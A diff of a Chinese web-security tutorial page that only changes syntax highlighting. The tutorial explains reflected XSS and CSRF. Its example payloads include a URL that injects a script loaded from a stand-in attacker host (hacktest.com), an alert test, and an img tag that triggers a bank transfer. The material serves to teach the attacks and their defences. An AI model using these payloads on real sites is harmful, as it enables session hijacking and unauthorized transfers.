@@ -497,7 +497,7 @@
 </li>
 </ul>
 <h4 id="XSS攻击的类型"><a href="#XSS攻击的类型" class="headerlink" title="XSS攻击的类型"></a>XSS攻击的类型</h4><h5 id="反射型XSS攻击"><a href="#反射型XSS攻击" class="headerlink" title="反射型XSS攻击"></a>反射型XSS攻击</h5><p>反射型XSS漏洞常见于通过URL传递参数的功能，如网站搜索，跳转等。由于需要用户主动打开恶意的URL才能生效，攻击者往往会结合多种手段诱导用户点击。比如下面的URL：</p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://x.x.x.x:8080/dosomething?message="&lt;script src="http://www.hacktest.com:8002/xss/hacker.js"&gt;&lt;/script&gt;"</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">http://localhost/test.php?param=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://x.x.x.x:8080/dosomething?message="<span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://www.hacktest.com:8002/xss/hacker.js"</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>"</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">http://localhost/test.php?param=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span>alert(/xss/)<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
 
 <p>POST的内容也可以触发反射型XSS，只不过它的触发条件比较苛刻（构建表单提交页面，并引导用户点击），所以非常少见。</p>
 <p><strong>攻击步骤：</strong></p>
@@ -572,7 +572,7 @@
 <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</span><br></pre></td></tr></table></figure>
 
 <p>危险网站 B，它里面有一段 HTML 的代码如下:</p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://www.mybank.com/Transfer.php?toBankId</span>=<span class="string">11&amp;money</span>=<span class="string">1000</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
 
 <p>首先，你登录了银行网站 A ，然后访问危险网站 B ，噢，这时你会发现你的银行账户少了 1000 块…</p>
 <h4 id="CSRF-攻击防范"><a href="#CSRF-攻击防范" class="headerlink" title="CSRF 攻击防范"></a>CSRF 攻击防范</h4><h5 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h5><p>验证码被认为是对抗 CSRF 攻击最简洁而有效的防御方法。</p>
